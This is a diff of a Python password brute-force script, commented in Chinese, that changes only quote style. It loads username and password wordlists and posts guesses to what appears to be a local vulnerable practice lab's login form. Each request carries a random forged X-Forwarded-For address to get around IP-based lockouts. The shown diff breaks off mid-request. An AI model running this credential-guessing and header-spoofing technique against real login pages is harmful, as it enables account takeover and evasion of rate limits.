@@ -7,8 +7,8 @@ from datetime import datetime, timedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 字典路径，置空就不读取
-USERNAME_DIC = 'D:\\Bruteforce\\username.txt' # /root/bruteforce/username.txt
-PASSWORD_DIC = 'D:\\Bruteforce\\password.txt' # /root/bruteforce/password.txt
+USERNAME_DIC = "D:\\Bruteforce\\username.txt" # /root/bruteforce/username.txt
+PASSWORD_DIC = "D:\\Bruteforce\\password.txt" # /root/bruteforce/password.txt
 
 # 字典
 USERNAME = []
@@ -25,39 +25,39 @@ THREAD = 1
 
 # 设置代理
 PROXIES = {
-    'http': 'http://127.0.0.1:8080',
-    'https': 'http://127.0.0.1:8080'
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
 }
 
 # 加载用户名字典
 try:
     if USERNAME_DIC:
-        with open(USERNAME_DIC, 'r') as f:
+        with open(USERNAME_DIC, "r") as f:
             USERNAME = f.readlines()
 except Exception as e:
-    print(f'[x] Cannot open "{USERNAME_DIC}" file {e}')
+    print(f"[x] Cannot open '{USERNAME_DIC}' file {e}")
     os._exit(0)
 
 # 加载密码字典
 try:
     if PASSWORD_DIC:
-        with open(PASSWORD_DIC, 'r') as f:
+        with open(PASSWORD_DIC, "r") as f:
             PASSWORD = f.readlines()
 except Exception as e:
-    print(f'[x] Cannot open "{PASSWORD_DIC}" file {e}')
+    print(f"[x] Cannot open '{PASSWORD_DIC}' file {e}")
     os._exit(0)
 
 # 设置Headers
 HEADERS = requests.utils.default_headers()
 HEADERS.update({
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
     "X-Requested-With": "XMLHttpRequest",
-    'Cookie': 'PHPSESSID=12312312312312312321312321312'
+    "Cookie": "PHPSESSID=12312312312312312321312321312"
 })
 
 # 随机IP生成
 def random_ipv4():
-    return '.'.join(str(random.randint(0,255)) for _ in range(4))
+    return ".".join(str(random.randint(0,255)) for _ in range(4))
 
 # 爆破函数，返回 (has_exception, found)
 def bruteforce(username, password):
@@ -65,7 +65,7 @@ def bruteforce(username, password):
     time.sleep(DELAY)
     
     try:
-        url = 'http://172.29.133.44/vul/burteforce/bf_form.php'
+        url = "http://172.29.133.44/vul/burteforce/bf_form.php"
         data = {
             "username": username,
             "password": password,
@@ -73,7 +73,7 @@ def bruteforce(username, password):
         }
         
         HEADERS.update({
-            'X-Forwarded-For': random_ipv4()
+            "X-Forwarded-For": random_ipv4()
         })
         response = requests.post(
             url,
